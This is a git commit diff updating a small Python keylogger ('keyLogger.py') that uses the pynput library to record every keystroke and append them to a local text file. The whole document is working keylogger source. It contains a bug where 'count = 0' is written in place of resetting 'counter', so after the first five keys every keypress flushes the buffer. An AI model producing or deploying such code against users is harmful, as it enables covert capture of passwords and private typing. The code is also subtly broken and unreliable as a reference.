72a9a43e426dcd630c1422846cea4e8646778a31
Pete Siravo <p.siravojr@gmail.com>
2019-11-21 21:40:03 -0500

    Update keyLogger.py

--- keyLogger.py
+++ keyLogger.py
@@ -4,17 +4,34 @@ import pynput
 from pynput.keyboard import Key, Listener
 
 keysPressed = []
+counter = 0
 
 def on_press(key):
-    global keysPressed
+    global keysPressed, counter
 
+    keysPressed.append(key)
+    counter += 1
+
+    if counter > 5:
+        create_file(keysPressed)
+        count = 0
+        keysPressed = []
+
+def on_release(key):
     if key == Key.esc:
         return False
 
-    keysPressed.append(key)
-
 def create_file(keysPressed):
-    
+    with open("loggedKeys.txt", "a") as file:
+        for key in keysPressed:
+            stringKey = str(key).replace("'","")
 
-with Listener(on_press=on_press) as listener:
+            if stringKey.find("space") > 0:
+                file.write("\n")
+            elif stringKey.find("enter") > 0:
+                file.write("\n")
+            if stringKey.find("Key") == -1:
+                file.write(stringKey)
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
